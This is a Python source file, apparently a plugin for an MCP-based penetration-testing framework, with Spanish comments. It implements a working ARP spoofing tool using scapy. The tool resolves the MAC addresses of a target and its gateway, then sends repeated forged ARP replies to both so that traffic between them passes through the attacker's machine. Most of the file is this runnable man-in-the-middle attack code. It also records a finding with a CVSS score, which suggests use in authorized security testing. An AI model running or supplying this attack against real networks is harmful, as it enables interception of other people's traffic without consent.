from core.mcp_protocol import MCPTool
import time
import sys

# Nota: Scapy es necesario para esto. pip install scapy
try:
    from scapy.all import ARP, Ether, sendp, srp, conf
except ImportError:
    pass


class ArpSpoofer(MCPTool):
    def __init__(self, project_id, guardian):
        super().__init__(
            name="ARP Spoofer",
            description="Intercepta tráfico LAN (MITM) falsificando ARP.",
            mitre_id="T1557.002",
            project_id=project_id,
            guardian=guardian,
        )

    def get_mac(self, ip):
        # Envía petición ARP para obtener la MAC real de la IP
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False
        )
        if ans:
            return ans[0][1].src
        return None

    def _execute(self, target_ip, gateway_ip=None):
        try:
            from scapy.all import ARP, send
        except ImportError:
            return {"status": "ERROR", "msg": "Falta librería: pip install scapy"}

        print(f"[*] ☠️  Iniciando ARP Poisoning contra {target_ip}...")

        # Si no nos dan gateway, intentamos adivinar (común: x.x.x.1)
        if not gateway_ip:
            parts = target_ip.split(".")
            parts[-1] = "1"
            gateway_ip = ".".join(parts)
            print(f"    ⚠️ Gateway no especificada. Asumiendo: {gateway_ip}")

        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            return {
                "status": "ERROR",
                "msg": "No se pudieron obtener las direcciones MAC. ¿Estás en la misma red?",
            }

        print(f"    🎯 Target: {target_ip} ({target_mac})")
        print(f"    🚪 Gateway: {gateway_ip} ({gateway_mac})")
        print(
            "    ⚡ Enviando paquetes (Ctrl+C para detener en modo manual, aquí enviaremos 10 paquetes)..."
        )

        # Enviamos ráfaga de 10 paquetes para envenenar la tabla ARP temporalmente
        try:
            for i in range(10):
                # Decirle a la víctima que YO soy el router
                send(
                    ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
                    verbose=False,
                )
                # Decirle al router que YO soy la víctima
                send(
                    ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
                    verbose=False,
                )
                time.sleep(1)
                sys.stdout.write(f"\r    [Packets sent: {i+1}/10]")
                sys.stdout.flush()

            self.save_finding(
                title="ARP Spoofing Successful",
                target=target_ip,
                evidence="Tablas ARP envenenadas temporalmente.",
                severity="High",  # MITM es grave
                cvss_score=8.0,
            )
            return {"status": "SUCCESS", "msg": "Ataque ejecutado (10 segundos)."}

        except Exception as e:
            return {"status": "ERROR", "msg": str(e)}
